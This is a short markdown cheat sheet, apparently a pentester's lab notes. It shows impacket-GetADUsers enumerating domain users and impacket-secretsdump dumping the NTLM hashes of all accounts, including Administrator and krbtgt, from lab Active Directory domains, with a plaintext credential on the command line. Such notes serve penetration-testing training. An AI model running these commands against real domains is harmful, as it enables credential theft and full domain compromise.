# Impacket Tools

## impacket-GetADUsers
impacket-GetADUsers
```
$ impacket-GetADUsers -all example.htb/olivia -dc-ip 10.129.240.70
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Querying 10.129.240.70 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-10-22 13:59:36.285281  2024-11-14 02:42:48.603280 
Guest                                                 <never>              <never>             
krbtgt                                                2024-10-04 14:53:28.687272  <never>             
olivia                                                2024-10-05 20:22:48.769574  <never>             
michael                                               2024-10-05 20:33:37.049043  <never>             
benjamin                                              2024-10-05 20:34:56.558374  2024-10-05 21:14:53.199541 
emily                                                 2024-10-30 18:40:02.775756  2024-10-30 16:23:46.169276 
ethan                                                 2024-10-12 15:52:14.117811  <never>             
alexander                                             2024-10-30 19:18:04.165508  <never>             
emma                                                  2024-10-30 19:18:35.259255  <never>             
$
```
## impacket-secretsdump
impacket-secretsdump
```
$ /usr/bin/impacket-secretsdump MARVEL.local/hawkeye:'Password123'@10.0.2.15 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cda5743ade6eb7ca63d2f0d45f7926b9:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\sqlservice:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\ppotts:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\wwilson:1111:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
hawkeye:1112:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:c4c33d0e625188cc5e5c4c3d4bed6fb5:::
PUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:0986831795491aea2c0f2795386ba1fa:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:8f0c6450503ef6bb2062dc0e393472d6:::
DEADPOOL$:1110:aad3b435b51404eeaad3b435b51404ee:12162bed324a134142d3be2a7cf8c79f:::
[*] Cleaning up... 
                                                                                                                    
$
```
